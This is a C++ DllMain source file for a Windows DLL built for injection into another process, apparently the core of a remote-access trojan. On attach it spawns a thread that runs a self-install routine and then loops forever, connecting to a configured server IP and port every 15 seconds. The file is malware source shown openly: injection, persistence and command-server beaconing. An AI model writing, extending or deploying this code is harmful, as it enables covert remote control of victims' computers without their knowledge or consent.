// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
#include "pch.h"
#include "stdafx.h"
#include "general.h"

#if _DEBUG
//TESTFUNC

void testMB(std::string s)		//TEST FUNCTION
{
    MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
}

//END TESTFUNC

#endif

DWORD WINAPI ThreadProc(LPVOID lpParam)
{
	//MessageBox(NULL, "Injection Start", "DLL Injection", MB_OK);

	LPTSTR lptstrValue = reinterpret_cast<LPTSTR>(lpParam);
	//VARIABLE SETUP
	General::lpArguments = lptstrValue;


	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
		return 0;


	Client MyClient(Settings::serverIP, Settings::serverPort); //Client

	while (true)
	{

		if (!MyClient.connected)
		{
			while (!MyClient.Connect())
			{
				Sleep(15000);
			}
		}
		Sleep(15000);
	}
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

	HANDLE hThread = NULL;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	{
		MessageBox(NULL, "Injection Start", "DLL Injection", MB_OK);
		hThread = CreateThread(NULL, 0, ThreadProc, (LPVOID)lpReserved, 0, NULL);
	}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

